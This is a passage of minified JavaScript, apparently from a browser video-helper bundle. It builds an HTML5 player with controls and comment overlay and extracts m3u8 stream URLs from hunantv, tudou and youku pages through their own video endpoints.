                                    this.DOMs.player.classList.remove("allscreen")
                            },
                            oncommentsBtnClick: function () {
                                this.enableComment = !this.DOMs["comments-btn"].classList.contains("enable"),
                                    this.enableComment ? (setTimeout(function () {
                                        this.DOMs.comments.style.display = "block"
                                    }.bind(this), 80), this.DOMs["comments-btn"].classList.add("enable")) : (this.DOMs.comments.style.display = "none", this.DOMs["comments-btn"].classList.remove("enable"))
                            },
                            onAirplayBtnClick: function () {
                                this.video.webkitShowPlaybackTargetPicker()
                            }
                        }
                    },
                        {
                            "./createElement": 7,
                            "./delegateClickByClassName": 8,
                            "./timeFormat": 14
                        }],
                    5: [function (e, t) {
                        var n = (e("./extend"), e("./createElement"));
                        e("./parseDOMByClassNames"),
                            t.exports = {
                                init: function () {
                                    var e = 0;
                                    this.sourceList.forEach(function (t, i) {
                                        n("li", {
                                            appendTo: this.DOMs.hd,
                                            sourceIndex: i,
                                            className: "source " + (i === e ? "curr" : ""),
                                            innerHTML: t[0]
                                        })
                                    }.bind(this)),
                                        this.DOMs.video.src = this.sourceList[e][1]
                                }
                            }
                    },
                        {
                            "./createElement": 7,
                            "./extend": 9,
                            "./parseDOMByClassNames": 11
                        }],
                    6: [function (e, t) {
                        var n = e("./timeFormat");
                        t.exports = {
                            init: function () {
                                this.video.addEventListener("timeupdate", this.onVideoTimeUpdate.bind(this)),
                                    this.video.addEventListener("play", this.onVideoPlay.bind(this)),
                                    this.video.addEventListener("pause", this.onVideoTimePause.bind(this)),
                                    this.video.addEventListener("loadedmetadata", this.onVideoLoadedMetaData.bind(this)),
                                    this.video.addEventListener("webkitplaybacktargetavailabilitychanged", this.onPlaybackTargetAvailabilityChanged.bind(this)),
                                    setInterval(this.videoBuffered.bind(this), 1e3),
                                    this.DOMs.volume_anchor.style.width = 100 * this.video.volume + "%"
                            },
                            onVideoTimeUpdate: function () {
                                var e = this.video.currentTime,
                                    t = this.video.duration;
                                this.DOMs.current.innerHTML = n(e),
                                    this.DOMs.duration.innerHTML = n(t),
                                this.DOMs.progress_anchor.draging || (this.DOMs.progress_anchor.style.width = 100 * Math.min(Math.max(e / t, 0), 1) + "%")
                            },
                            videoBuffered: function () {
                                var e = this.video.buffered,
                                    t = this.video.currentTime,
                                    n = 0 == e.length ? 0 : e.end(e.length - 1);
                                this.DOMs.buffered_anchor.style.width = 100 * Math.min(Math.max(n / this.video.duration, 0), 1) + "%",
                                    0 == n || t >= n ? this.DOMs.player.classList.add("loading") : this.DOMs.player.classList.remove("loading")
                            },
                            onVideoPlay: function () {
                                this.DOMs.play.classList.remove("paused")
                            },
                            onVideoTimePause: function () {
                                this.DOMs.play.classList.add("paused")
                            },
                            onVideoLoadedMetaData: function () {
                                this.video.preloadStartTime && (this.video.currentTime = this.video.preloadStartTime, delete this.video.preloadStartTime)
                            },
                            onPlaybackTargetAvailabilityChanged: function (e) {
                                var t = "support-airplay";
                                "available" === e.availability ? this.DOMs.player.classList.add(t) : this.DOMs.player.classList.remove(t)
                            }
                        }
                    },
                        {
                            "./timeFormat": 14
                        }],
                    7: [function (e, t) {
                        function n(e, t) {
                            var n = document.createElement(e);
                            if ("function" == typeof t) t.call(n);
                            else for (var i in t) if (t.hasOwnProperty(i)) switch (i) {
                                case "appendTo":
                                    t[i].appendChild(n);
                                    break;
                                case "text":
                                    var o = document.createTextNode(t[i]);
                                    n.innerHTML = "",
                                        n.appendChild(o);
                                    break;
                                case "innerHTML":
                                case "className":
                                case "id":
                                    n[i] = t[i];
                                    break;
                                case "style":
                                    var r = t[i];
                                    for (var a in r) r.hasOwnProperty(a) && (n.style[a] = r[a]);
                                    break;
                                default:
                                    n.setAttribute(i, t[i] + "")
                            }
                            return n
                        }
                        t.exports = n
                    },
                        {}],
                    8: [function (e, t) {
                        function n(e) {
                            return Array.prototype.slice.call(e)
                        }
                        function i(e) {
                            this._eventMap = {},
                                this._rootElement = e,
                                this._isRootElementBindedClick = !1,
                                this._bindClickFunction = function (e) {
                                    !
                                        function t(e, i) {
                                            i && i.nodeName && (i.classList && n(i.classList).forEach(function (t) {
                                                e.trigger(t, i)
                                            }), t(e, i.parentNode))
                                        }(this, e.target)
                                }.bind(this)
                        }
                        var o = e("./extend");
                        o(i.prototype, {
                            on: function (e, t, n) {
                                void 0 === this._eventMap[e] && (this._eventMap[e] = []),
                                    this._eventMap[e].push([t, n]),
                                this._isRootElementBindedClick || (_isRootElementBindedClick = !0, this._rootElement.addEventListener("click", this._bindClickFunction, !1))
                            },
                            off: function (e, t) {
                                if (void 0 != this._eventMap[e]) for (var n = this._eventMap[e].length; n--;) if (this._eventMap[e][n][0] === t) {
                                    this._eventMap[e].splice(n, 1);
                                    break
                                }
                                for (var i in this._eventMap) break;
                                void 0 === i && this._isRootElementBindedClick && (_isRootElementBindedClick = !1, this._rootElement.removeEventListener("click", this._bindClickFunction, !1))
                            },
                            trigger: function (e, t) {
                                t = void 0 === t ? this._rootElement.getElementsByTagNames(e) : [t],
                                    t.forEach(function (t) {
                                        (this._eventMap[e] || []).forEach(function (e) {
                                            e[0].call(e[1], t)
                                        })
                                    }.bind(this))
                            }
                        }),
                            t.exports = function (e) {
                                return new i(e)
                            }
                    },
                        {
                            "./extend": 9
                        }],
                    9: [function (e, t) {
                        function n(e) {
                            for (var t, n = arguments.length, i = 1; n > i;) {
                                t = arguments[i++];
                                for (var o in t) t.hasOwnProperty(o) && (e[o] = t[o])
                            }
                            return e
                        }
                        t.exports = n
                    },
                        {}],
                    10: [function (e) {
                        function t(e, t, n, i) {
                            this.id = e,
                                this.size = t.split("x"),
                                this.sourceList = n || [],
                                this.comments = i,
                                this.init()
                        }
                        e("./component")(t, e("./component_build"), e("./component_event"), e("./component_video"), e("./component_source"), e("./component_comments")),
                            n = t
                    },
                        {
                            "./component": 1,
                            "./component_build": 2,
                            "./component_comments": 3,
                            "./component_event": 4,
                            "./component_source": 5,
                            "./component_video": 6
                        }],
                    11: [function (e, t) {
                        function n(e, t) {
                            var n = {};
                            return t.forEach(function (t) {
                                n[t] = e.getElementsByClassName(t)[0]
                            }),
                                n
                        }
                        t.exports = n
                    },
                        {}],
                    12: [function (e, t) {
                        t.exports = '* { margin:0; padding:0; }body { font-family: "PingHei","Lucida Grande", "Lucida Sans Unicode", "STHeiti", "Helvetica","Arial","Verdana","sans-serif"; font-size:16px;}html, body, .player { height: 100%; }.player:-webkit-full-screen { width: 100%; cursor:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==); }.player:-moz-full-screen { width: 100%; cursor:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==); }.player:full-screen { width: 100%; cursor:url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==); }.player { border-radius: 3px; overflow: hidden; position: relative; cursor: default;  -webkit-user-select: none;  -moz-user-select: none; user-select: none;}.video-frame { box-sizing: border-box; padding-bottom: 50px; height: 100%; overflow: hidden; position: relative;}.video-frame .comments{ position: absolute; top:0;left:0; width:100%; height:100%;  -webkit-transform:translateZ(0);  -moz-transform:translateZ(0); transform:translateZ(0);  pointer-events: none;}.player:-webkit-full-screen .video-frame { padding-bottom: 0px; }.player:-moz-full-screen .video-frame { padding-bottom: 0px; }.player:full-screen .video-frame{ padding-bottom: 0px; }.video { width: 100%;  height: 100%; background: #000000;}.controller {  position: absolute; bottom: 0px;  left:0; right:0;  background: #24272A;  height: 50px;}.controller .loading-icon { display: none;  position: absolute; width: 20px;  height: 20px; line-height: 20px;  text-align: center; font-size: 20px;  color: #ffffff; top: -30px; right: 10px;}.player.loading .controller .loading-icon {  display: block;}.player:-webkit-full-screen .controller { -webkit-transform:translateY(50px); -webkit-transition: -webkit-transform 0.3s ease;}.player:-moz-full-screen .controller { -moz-transform:translateY(50px);  -moz-transition: -moz-transform 0.3s ease;}.player:full-screen .controller {  transform:translateY(50px); transition: transform 0.3s ease;}.player.active:-webkit-full-screen { cursor: default;}.player.active:-moz-full-screen {  cursor: default;}.player.active:full-screen { cursor: default;}.player.active:-webkit-full-screen .controller,.player:-webkit-full-screen .controller:hover { -webkit-transform:translateY(0);  cursor: default;}.player.active:-moz-full-screen .controller,.player:-moz-full-screen .controller:hover { -moz-transform:translateY(0); cursor: default;}.player.active:full-screen .controller.player:full-screen .controller:hover {  transform:translateY(0);  cursor: default;}.player.active:-webkit-full-screen .controller .progress .progress_anchor:after,.player:-webkit-full-screen .controller:hover .progress .progress_anchor:after { height:12px;}.player.active:-moz-full-screen .controller .progress .progress_anchor:after,.player:-moz-full-screen .controller:hover .progress .progress_anchor:after { height:12px;}.player.active:full-screen .controller .progress .progress_anchor:after,.player:full-screen .controller:hover .progress .progress_anchor:after { height:12px;}.player:-webkit-full-screen .controller .progress .progress_anchor:after { height:4px;}.player:-moz-full-screen .controller .progress .progress_anchor:after { height:4px;}.player:full-screen .controller .progress .progress_anchor:after {  height:4px;}.controller .progress { position: absolute; top:0px;  left:0; right:0;  border-right: 4px solid #181A1D;  border-left: 8px solid #B3ABAB; height: 4px;  background: #181A1D;  z-index:1;  -webkit-transform: translateZ(0); -moz-transform: translateZ(0);  transform: translateZ(0);}.controller .progress:after { content:""; display: block; position: absolute; top:0px;  left:0; right:0;  bottom:-10px; height: 10px;}.controller .progress .anchor { height: 4px;  background: #B3ABAB;  position: absolute; top:0;left:0;}.controller .progress .anchor:after { content:""; display: block; width: 12px;  background: #f5f5f5;  position: absolute; right:-4px; top: 50%; height: 12px; box-shadow: 0 0 2px rgba(0,0,0, 0.4); border-radius: 12px;  -webkit-transform: translateY(-50%);  -moz-transform: translateY(-50%); transform: translateY(-50%);}.controller .progress .anchor.buffered_anchor {  position: relative; background: rgba(255,255,255,0.1);}.controller .progress .anchor.buffered_anchor:after {  box-shadow: none; height: 4px;  width: 4px; border-radius: 0; background: rgba(255,255,255,0.1);}.controller .right { height: 50px; position: absolute; top:0;  left:10px;  right:10px; pointer-events: none;}.controller .play,.controller .volume,.controller .time,.controller .hd,.controller .airplay,.controller .allscreen,.controller .normalscreen,.controller .comments-btn,.controller .fullscreen { padding-top:4px;  height: 46px; line-height: 50px;  text-align: center; color: #eeeeee; float:left; text-shadow:0 0 2px rgba(0,0,0,0.5);  pointer-events: auto;}.controller .hd,.controller .airplay,.controller .allscreen,.controller .normalscreen,.controller .comments-btn,.controller .fullscreen { float:right;}.controller .play {  width: 36px;  padding-left: 10px; cursor: pointer;}.controller .play:after {  font-family: "FontAwesome"; content: "\\f04c";}.controller .play.paused:after { content: "\\f04b";}.controller .volume {  min-width: 30px;  position: relative; overflow: hidden; -webkit-transition: min-width 0.3s ease 0.5s; -moz-transition: min-width 0.3s ease 0.5s;  transition: min-width 0.3s ease 0.5s;}.controller .volume:hover { min-width: 128px;}.controller .volume:before {  font-family: "FontAwesome"; content: "\\f028";  width: 36px;  display: block;}.controller .volume .progress { width: 70px;  top: 27px;  left: 40px;}.controller .time { font-size: 12px;  font-weight: bold;  padding-left: 10px;}.controller .time .current {  color: #EEEEEE;}.controller .fullscreen,.controller .airplay,.controller .allscreen,.controller .comments-btn,.controller .normalscreen { width: 36px;  cursor: pointer;}.controller .comments-btn {  margin-right: -15px;  display: none;}.player.has-comments .controller .comments-btn { display: block;}.controller .comments-btn:before {  font-family: "FontAwesome"; content: "\\f075";}.controller .comments-btn.enable:before {  color: #DF6558;}.controller .airplay,.controller .normalscreen {  display: none;}.player:-webkit-full-screen .controller .fullscreen,.player:-webkit-full-screen .controller .allscreen { display: none;}.player:-webkit-full-screen .controller .normalscreen,.player.allscreen .controller .normalscreen,.player.support-airplay .controller .airplay { display: block;}.player.allscreen .controller .allscreen {  display: none;}.controller .fullscreen:before { font-family: "FontAwesome"; content: "\\f0b2";}.controller .allscreen:before {  font-family: "FontAwesome"; content: "\\f065";}.controller .normalscreen:before { font-family: "FontAwesome"; content: "\\f066";}.controller .airplay { background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0ibWFtYS1haXJwbGF5LWljb24iIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIxNnB4IiB2aWV3Qm94PSIwIDAgMjIgMTYiIHhtbDpzcGFjZT0icHJlc2VydmUiPjxwb2x5bGluZSBwb2ludHM9IjUsMTIgMSwxMiAxLDEgMjEsMSAyMSwxMiAxNywxMiIgc3R5bGU9ImZpbGw6dHJhbnNwYXJlbnQ7c3Ryb2tlOndoaXRlO3N0cm9rZS13aWR0aDoxIi8+PHBvbHlsaW5lIHBvaW50cz0iNCwxNiAxMSwxMCAxOCwxNiIgc3R5bGU9ImZpbGw6d2hpdGU7c3Ryb2tlOnRyYW5zcGFyZW50O3N0cm9rZS13aWR0aDowIi8+PC9zdmc+DQo=) no-repeat center 20px;  background-size: 22px auto;}.controller .hd { white-space:nowrap; overflow: hidden; margin-right: 10px; text-align: right;}.controller .hd:hover li { max-width: 300px;}.controller .hd li {  display: inline-block;  max-width: 0px; -webkit-transition: max-width 0.8s ease 0.3s; -moz-transition: max-width 0.8s ease 0.3s;  transition: max-width 0.8s ease 0.3s; overflow: hidden; font-size: 14px;  font-weight: bold;  position: relative; cursor: pointer;}.controller .hd li:before {  content: "";  display: inline-block;  width:20px;}.controller .hd li:before { content: "";  display: inline-block;  width:20px;}.controller .hd li.curr { max-width: 300px; cursor: default;  color: #EEEEEE;}.controller .hd li.curr:after { content: "";  display: block; position: absolute; width:4px;  height:4px; border-radius: 50%; background: #ffffff;  left: 12px; top: 23px;  opacity: 0; -webkit-transition: opacity 0.5s ease 0.3s; -moz-transition: opacity 0.5s ease 0.3s;  transition: opacity 0.5s ease 0.3s;}'
                    },
                        {}],
                    13: [function (e, t) {
                        t.exports = '<div class="player">  <div class="video-frame"><video class="video" autoplay="autoplay"></video><canvas class="comments"></canvas></div>  <div class="controller">    <div class="loading-icon fa fa-spin fa-circle-o-notch"></div>   <div class="progress">      <div class="anchor buffered_anchor" style="width:0%"></div>     <div class="anchor progress_anchor" style="width:0%"></div>   </div>    <div class="right">     <div class="fullscreen"></div>      <div class="allscreen"></div>     <div class="normalscreen"></div>      <div class="airplay"></div>     <ul class="hd"></ul>      <div class="comments-btn"></div>     </div>    <div class="left">     <div class="play paused"></div>     <div class="volume">        <div class="progress">          <div class="anchor volume_anchor" style="width:0%"></div>       </div>      </div>      <div class="time">        <span class="current">00:00:00</span> / <span class="duration">00:00:00</span>      </div>     </div> </div></div>'
                    },
                        {}],
                    14: [function (e, t) {
                        function n(e, t) {
                            return (Array(t).join(0) + e).slice(-t)
                        }
                        function i(e) {
                            var t, i = [];
                            return [3600, 60, 1].forEach(function (o) {
                                i.push(n(t = e / o | 0, 2)),
                                    e -= t * o
                            }),
                                i.join(":")
                        }
                        t.exports = i
                    },
                        {}]
                }, {}, [10]),
                t.exports = n
        },
            {}],
        10: [function (e, t) {
            function n(e, t) {
                for (var n = decodeURI(e), i = f[t ? "strict" : "loose"].exec(n), o = {
                    attr: {},
                    param: {},
                    seg: {}
                }, r = 14; r--;) o.attr[p[r]] = i[r] || "";
                return o.param.query = a(o.attr.query),
                    o.param.fragment = a(o.attr.fragment),
                    o.seg.path = o.attr.path.replace(/^\/+|\/+$/g, "").split("/"),
                    o.seg.fragment = o.attr.fragment.replace(/^\/+|\/+$/g, "").split("/"),
                    o.attr.base = o.attr.host ? (o.attr.protocol ? o.attr.protocol + "://" + o.attr.host : o.attr.host) + (o.attr.port ? ":" + o.attr.port : "") : "",
                    o
            }
            function i(e, t) {
                if (0 === e[t].length) return e[t] = {};
                var n = {};
                for (var i in e[t]) n[i] = e[t][i];
                return e[t] = n,
                    n
            }
            function o(e, t, n, r) {
                var a = e.shift();
                if (a) {
                    var s = t[n] = t[n] || [];
                    "]" == a ? d(s) ? "" !== r && s.push(r) : "object" == typeof s ? s[u(s).length] = r : s = t[n] = [t[n], r] : ~a.indexOf("]") ? (a = a.substr(0, a.length - 1), !v.test(a) && d(s) && (s = i(t, n)), o(e, s, a, r)) : (!v.test(a) && d(s) && (s = i(t, n)), o(e, s, a, r))
                } else d(t[n]) ? t[n].push(r) : t[n] = "object" == typeof t[n] ? r : "undefined" == typeof t[n] ? r : [t[n], r]
            }
            function r(e, t, n) {
                if (~t.indexOf("]")) {
                    var i = t.split("[");
                    o(i, e, "base", n)
                } else {
                    if (!v.test(t) && d(e.base)) {
                        var r = {};
                        for (var a in e.base) r[a] = e.base[a];
                        e.base = r
                    }
                    "" !== t && s(e.base, t, n)
                }
                return e
            }
            function a(e) {
                return c(String(e).split(/&|;/), function (e, t) {
                    try {
                        t = decodeURIComponent(t.replace(/\+/g, " "))
                    } catch (n) {}
                    var i = t.indexOf("="),
                        o = l(t),
                        a = t.substr(0, o || i),
                        s = t.substr(o || i, t.length);
                    return s = s.substr(s.indexOf("=") + 1, s.length),
                    "" === a && (a = t, s = ""),
                        r(e, a, s)
                }, {
                    base: {}
                }).base
            }
            function s(e, t, n) {
                var i = e[t];
                "undefined" == typeof i ? e[t] = n : d(i) ? i.push(n) : e[t] = [i, n]
            }
            function l(e) {
                for (var t, n, i = e.length, o = 0; i > o; ++o) if (n = e[o], "]" == n && (t = !1), "[" == n && (t = !0), "=" == n && !t) return o
            }
            function c(e, t) {
                for (var n = 0, i = e.length >> 0, o = arguments[2]; i > n;) n in e && (o = t.call(void 0, o, e[n], n, e)),
                    ++n;
                return o
            }
            function d(e) {
                return "[object Array]" === Object.prototype.toString.call(e)
            }
            function u(e) {
                var t = [];
                for (var n in e) e.hasOwnProperty(n) && t.push(n);
                return t
            }
            function h(e, t) {
                return 1 === arguments.length && e === !0 && (t = !0, e = void 0),
                    t = t || !1,
                    e = e || window.location.toString(),
                {
                    data: n(e, t),
                    attr: function (e) {
                        return e = m[e] || e,
                            "undefined" != typeof e ? this.data.attr[e] : this.data.attr
                    },
                    param: function (e) {
                        return "undefined" != typeof e ? this.data.param.query[e] : this.data.param.query
                    },
                    fparam: function (e) {
                        return "undefined" != typeof e ? this.data.param.fragment[e] : this.data.param.fragment
                    },
                    segment: function (e) {
                        return "undefined" == typeof e ? this.data.seg.path : (e = 0 > e ? this.data.seg.path.length + e : e - 1, this.data.seg.path[e])
                    },
                    fsegment: function (e) {
                        return "undefined" == typeof e ? this.data.seg.fragment : (e = 0 > e ? this.data.seg.fragment.length + e : e - 1, this.data.seg.fragment[e])
                    }
                }
            }
            var p = ["source", "protocol", "authority", "userInfo", "user", "password", "host", "port", "relative", "path", "directory", "file", "query", "fragment"],
                m = {
                    anchor: "fragment"
                },
                f = {
                    strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
                    loose: /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
                },
                v = /^[0-9]+$/;
            t.exports = h
        },
            {}],
        11: [function (e, t) {
            function n(e) {
                var t = [];
                for (var n in e) e.hasOwnProperty(n) && t.push([n, e[n]].join("="));
                return t.join("&")
            }
            t.exports = n
        },
            {}],
        12: [function (e, t, n) {
            var i = e("./canPlayM3U8"),
                o = e("./ajax");
            n.match = function (e) {
                return /www\.hunantv\.com/.test(e.attr("host"))
            },
                n.getVideos = function (e, t) {
                    if (i) {
                        var n = function (e) {
                                var t = e.split("?")[1],
                                    n = new Array;
                                n = t.split("&");
                                var i = {};
                                for (key in n) param = n[key],
                                    item = new Array,
                                    item = n[key].split("="),
                                "" != item[0] && (i[item[0]] = item[1]);
                                return i
                            },
                            r = "&fmt=6&pno=7&m3u8=1",
                            a = document.getElementsByName("FlashVars")[0].getAttribute("value"),
                            s = a.split("&file=")[1],
                            l = s.split("%26fmt")[0];
                        l += r,
                            l = decodeURIComponent(l),
                            params = n(l);
                        var c = new Array;
                        c = ["570", "1056", "1615"],
                            urls = new Array,
                            params.limitrate = c[0],
                            text = "\u6807\u6e05",
                            o({
                                url: "http://pcvcr.cdn.imgo.tv/ncrs/vod.do",
                                jsonp: !0,
                                param: params,
                                callback: function (e) {
                                    "ok" == e.status && urls.push([text, e.info]),
                                        params.limitrate = c[1],
                                        text = "\u9ad8\u6e05",
                                        o({
                                            url: "http://pcvcr.cdn.imgo.tv/ncrs/vod.do",
                                            jsonp: !0,
                                            param: params,
                                            callback: function (e) {
                                                "ok" == e.status && urls.push([text, e.info]),
                                                    params.limitrate = c[2],
                                                    text = "\u8d85\u6e05",
                                                    o({
                                                        url: "http://pcvcr.cdn.imgo.tv/ncrs/vod.do",
                                                        jsonp: !0,
                                                        param: params,
                                                        callback: function (e) {
                                                            return "ok" == e.status && urls.push([text, e.info]),
                                                                t(urls)
                                                        }
                                                    })
                                            }
                                        })
                                }
                            })
                    } else console.log("\u8bf7\u4f7f\u7528Safari\u89c2\u770b\u672c\u89c6\u9891"),
                        setTimeout(function () {
                            return t()
                        }, 2e3)
                }
        },
            {
                "./ajax": 2,
                "./canPlayM3U8": 3
            }],
        13: [function (e, t, n) {
            var i = e("./canPlayM3U8"),
                o = e("./ajax"),
                r = e("./seeker_youku");
            n.match = function (e) {
                var t = window.iid || window.pageConfig && window.pageConfig.iid || window.itemData && window.itemData.iid,
                    n = window.itemData && window.itemData.vcode;
                return /tudou\.com/.test(e.attr("host")) && (n || t)
            },
                n.getVideos = function (e, t) {
                    var n = window.itemData && window.itemData.vcode;
                    if (n) return r.parseYoukuCode(n, t);
                    var a = window.iid || window.pageConfig && window.pageConfig.iid || window.itemData && window.itemData.iid,
                        s = function (e) {
                            var t, n = [
                                ["\u539f\u753b", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=5"],
                                ["\u8d85\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=4"],
                                ["\u9ad8\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=3"],
                                ["\u6807\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=2"]
                            ];
                            window.itemData && window.itemData.segs && (n = [], t = JSON.parse(window.itemData.segs), t[5] && n.push(["\u539f\u753b", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=5"]), t[4] && n.push(["\u8d85\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=4"]), t[3] && n.push(["\u9ad8\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=3"]), t[2] && n.push(["\u6807\u6e05", "http://vr.tudou.com/v2proxy/v2.m3u8?it=" + a + "&st=2"])),
                                console.log("\u89e3\u6790tudou\u89c6\u9891\u5730\u5740\u6210\u529f " + n.map(function (e) {
                                        return "<a href=" + e[1] + ">" + e[0] + "</a>"
                                    }).join(" ")),
                                e(n)
                        },
                        l = function (e) {
                            o({
                                url: "http://vr.tudou.com/v2proxy/v2.js",
                                param: {
                                    it: a,
                                    st: "52%2C53%2C54"
                                },
                                jsonp: "jsonp",
                                callback: function (t) {
                                    if (-1 === t || -1 == t.code) return console.log("\u89e3\u6790tudou\u89c6\u9891\u5730\u5740\u5931\u8d25");
                                    for (var n = [], i = 0, o = t.urls.length; o > i; i++) n.push([i, t.urls[i]]);
                                    return console.log("\u89e3\u6790tudou\u89c6\u9891\u5730\u5740\u6210\u529f " + n.map(function (e) {
                                            return "<a href=" + e[1] + ">" + e[0] + "</a>"
                                        }).join(" ")),
                                        e(n)
                                }
                            })
                        };
                    i ? s(t) : l(t)
                }
        },
            {
                "./ajax": 2,
                "./canPlayM3U8": 3,
                "./seeker_youku": 14
            }],
        14: [function (e, t, n) {
            function i(e) {
                var t = [];
                for (var n in e) t.push(n + "=" + e[n]);
                return t.join("&")
            }
            function o(e) {
                if (!e) return "";
                e = e.toString();
                var t, n, i, o, r, a, s, l = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);
                for (a = e.length, r = 0, s = ""; a > r;) {
                    do t = l[255 & e.charCodeAt(r++)];
                    while (a > r && -1 == t);
                    if (-1 == t) break;
                    do n = l[255 & e.charCodeAt(r++)];
                    while (a > r && -1 == n);
                    if (-1 == n) break;
                    s += String.fromCharCode(t << 2 | (48 & n) >> 4);
                    do {
                        if (i = 255 & e.charCodeAt(r++), 61 == i) return s;
                        i = l[i]
                    } while (a > r && -1 == i);
                    if (-1 == i) break;
                    s += String.fromCharCode((15 & n) << 4 | (60 & i) >> 2);
                    do {
                        if (o = 255 & e.charCodeAt(r++), 61 == o) return s;
                        o = l[o]
                    } while (a > r && -1 == o);
                    if (-1 == o) break;
                    s += String.fromCharCode((3 & i) << 6 | o)
                }
                return s
            }
            function r(e) {
                if (!e) return "";
                e = e.toString();
                var t, n, i, o, r, a, s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                for (i = e.length, n = 0, t = ""; i > n;) {
                    if (o = 255 & e.charCodeAt(n++), n == i) {
                        t += s.charAt(o >> 2),
                            t += s.charAt((3 & o) << 4),
                            t += "==";
                        break
                    }
                    if (r = e.charCodeAt(n++), n == i) {
                        t += s.charAt(o >> 2),
                            t += s.charAt((3 & o) << 4 | (240 & r) >> 4),
                            t += s.charAt((15 & r) << 2),
                            t += "=";
                        break
                    }
                    a = e.charCodeAt(n++),
                        t += s.charAt(o >> 2),
                        t += s.charAt((3 & o) << 4 | (240 & r) >> 4),
                        t += s.charAt((15 & r) << 2 | (192 & a) >> 6),
                        t += s.charAt(63 & a)
                }
                return t
            }
            function a(e, t) {
                for (var n, i = [], o = 0, r = "", a = 0; 256 > a; a++) i[a] = a;
                for (a = 0; 256 > a; a++) o = (o + i[a] + e.charCodeAt(a % e.length)) % 256,
                    n = i[a],
                    i[a] = i[o],
                    i[o] = n;
                a = 0,
                    o = 0;
                for (var s = 0; s < t.length; s++) a = (a + 1) % 256,
                    o = (o + i[a]) % 256,
                    n = i[a],
                    i[a] = i[o],
                    i[o] = n,
                    r += String.fromCharCode(t.charCodeAt(s) ^ i[(i[a] + i[o]) % 256]);
                return r
            }
            function s(e, t) {
                for (var n = [], i = 0; i < e.length; i++) {
                    var o = 0;
                    o = e[i] >= "a" && e[i] <= "z" ? e[i].charCodeAt(0) - "a".charCodeAt(0) : e[i] - "0" + 26;
                    for (var r = 0; 36 > r; r++) if (t[r] == o) {
                        o = r;
                        break
                    }
                    n[i] = o > 25 ? o - 26 : String.fromCharCode(o + 97)
                }
                return n.join("")
            }
            function l(e, t, n) {
                var i = this;
                new Date,
                    this._sid = m.sid,
                    this._fileType = n,
                    this._videoSegsDic = {},
                    this._ip = e.security.ip;
                var o = (new c, []),
                    r = [];
                r.streams = {},
                    r.logos = {},
                    r.typeArr = {},
                    r.totalTime = {};
                for (var a = 0; a < t.length; a++) {
                    for (var s = t[a].audio_lang, l = !1, d = 0; d < o.length; d++) if (o[d] == s) {
                        l = !0;
                        break
                    }
                    l || o.push(s)
                }
                for (var a = 0; a < o.length; a++) {
                    for (var u = o[a], h = {}, p = {}, f = [], d = 0; d < t.length; d++) {
                        var v = t[d];
                        if (u == v.audio_lang) {
                            if (!i.isValidType(v.stream_type)) continue;
                            var g = i.convertType(v.stream_type),
                                y = 0;
                            "none" != v.logo && (y = 1),
                                p[g] = y;
                            var b = !1;
                            for (var w in f) g == f[w] && (b = !0);
                            b || f.push(g);
                            var x = v.segs;
                            if (null == x) continue;
                            var k = [];
                            b && (k = h[g]);
                            for (var A = 0; A < x.length; A++) {
                                var C = x[A];
                                if (null == C) break;
                                var T = {};
                                T.no = A,
                                    T.size = C.size,
                                    T.seconds = Number(C.total_milliseconds_video) / 1e3,
                                    T.milliseconds_video = Number(v.milliseconds_video) / 1e3,
                                    T.key = C.key,
                                    T.fileId = this.getFileId(v.stream_fileid, A),
                                    T.src = this.getVideoSrc(d, A, e, v.stream_type, T.fileId),
                                    T.type = g,
